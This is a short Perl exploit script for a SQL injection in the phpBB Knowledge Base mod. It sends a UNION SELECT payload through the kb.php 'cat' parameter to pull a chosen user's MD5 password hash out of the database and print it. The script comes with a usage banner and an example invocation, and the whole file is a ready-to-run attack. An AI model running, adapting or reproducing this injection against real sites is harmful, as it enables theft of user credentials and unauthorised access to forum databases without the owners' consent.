#usr/bin/perl -w
#phpBB Knowledge Base(Articles) Mode SQL injection
#Exploit Created By xxSxx Aka SkOd
#ISRAEL
#xxsxx.uk@gmail.com

use LWP::Simple;
if (@ARGV < 4){
print q{
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-=-=- phpBB KB Mode GET HASH Exploit =-=-=
-=-=-     Bug & Exploit by SkOd      =-=-=
-=-=-     Tested On phpBB 2.0.17     -=-=-
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Usage:
kb.pl [HOST] [PATH] [USER_ID] [TABLE]
kb.pl http://www.host.com /phpbb/ 2 phpbb_
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
};
exit;
}
print "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=\n";
$url = "kb.php?mode=cat&cat=-1%20UNION%20SELECT%200,user_password,0,0,0,0%20FROM%20".$ARGV[3]."users%20WHERE%20user_id=".$ARGV[2];
$page = get($ARGV[0].$ARGV[1].$url) || die "[-] ERROR";
print "[+]Connected...\n";
print "[+]User id: $ARGV[2]\n";
$page =~ s/>(.*?):://eg;
$page =~ m/<title(.*?)<\/title>/ && print "[+]Md5 Hash: $1\n";
print "[+]DONE!!\n";
print "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=\n"; 